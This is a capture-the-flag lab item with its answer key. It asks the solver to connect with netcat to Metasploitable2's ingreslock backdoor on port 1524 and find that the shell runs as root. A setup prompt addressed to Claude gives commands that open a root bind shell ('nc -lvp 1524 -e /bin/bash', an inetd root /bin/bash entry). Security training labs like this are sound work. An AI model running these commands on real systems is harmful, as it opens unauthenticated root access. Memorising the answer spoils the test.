# Q061 — Bindshell on Port 1524

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `nc (netcat)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Connect to Metasploitable port 1524 with netcat. What user is the shell?

---

## 🎯 Flag Format

```
user=<name>
```

Example: `user=root`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`nc 192.168.52.129 1524`
</details>

<details>
<summary>Hint 2</summary>

Pre-bound `ingreslock` rootshell.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
nc 192.168.52.129 1524
# id
```

Direct root shell — pre-installed.

**Answer:** `user=root`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q061:
1. Verify Metasploitable2 (192.168.52.129) up; ingreslock/bindshell process on port 1524 active: ssh msfadmin@192.168.52.129 → ps aux | grep 1524 (Metasploitable2 spawns /bin/sh on 1524 via inetd by default).
2. If not listening: ssh msfadmin, sudo nc -lvp 1524 -e /bin/bash & (or enable in /etc/inetd.conf: ingreslock stream tcp nowait root /bin/bash).
3. From Parrot: nc -v 192.168.52.129 1524 must succeed.

Report back: "Lab ready for Q061 — bindshell listening on 192.168.52.129:1524".
```
